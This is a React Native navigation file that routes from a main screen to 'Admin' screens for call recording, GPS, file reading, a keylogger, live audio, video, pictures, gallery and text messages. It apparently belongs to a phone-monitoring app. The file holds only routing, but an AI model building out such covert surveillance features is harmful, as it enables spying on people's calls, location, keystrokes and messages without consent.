import {createStackNavigator} from 'react-navigation-stack';
import SafeAreaView from 'react-native-safe-area-context';
import { createAppContainer } from 'react-navigation';
import mainScreen from './../component/mainScreen';
import callRecording from './../component/Admin/callRecording';
import GPS from './../component/Admin/GPS';
import fileReading from './../component/Admin/fileReading';
import keyLogger from './../component/Admin/keyLogger';
import liveAudio from './../component/Admin/liveAudio';
import chat from './../component/Admin/chat';
import video from './../component/Admin/video';
import picture from './../component/Admin/picture';
import gallery from './../component/Admin/gallery';
import detailMessage from './../component/Admin/detailMessage';
import textMessage from './../component/Admin/textMessage';

const Route =  createStackNavigator({
    mainScreen: {
        screen: mainScreen,
        navigationOptions: {
            headerShown: false
        },
    },
    callRecording: {
        screen: callRecording,
        navigationOptions: {
            headerShown: false
        },
    },
    GPS: {
        screen: GPS,
        navigationOptions: {
            headerShown: false
        },
    },
    video: {
        screen: video,
        navigationOptions: {
            headerShown: false
        },
    },
    picture: {
        screen: picture,
        navigationOptions: {
            headerShown: false
        },
    },
    gallery: {
        screen: gallery,
        navigationOptions: {
            headerShown: false
        },
    },
    fileReading: {
        screen: fileReading,
        navigationOptions: {
            headerShown: false
        },
    },
    keyLogger: {
        screen: keyLogger,
        navigationOptions: {
            headerShown: false
        },
    },
    liveAudio: {
        screen: liveAudio,
        navigationOptions: {
            headerShown: false
        },
    },
    chat: {
        screen: chat,
        navigationOptions: {
            headerShown: false
        },
    },
    detailMessage: {
        screen: detailMessage,
        navigationOptions: {
            headerShown: false
        },
    },
    textMessage: {
        screen: textMessage,
        navigationOptions: {
            headerShown: false
        },
    },
  },{
      initialRouteName: 'mainScreen'
  })

export default createAppContainer(Route);

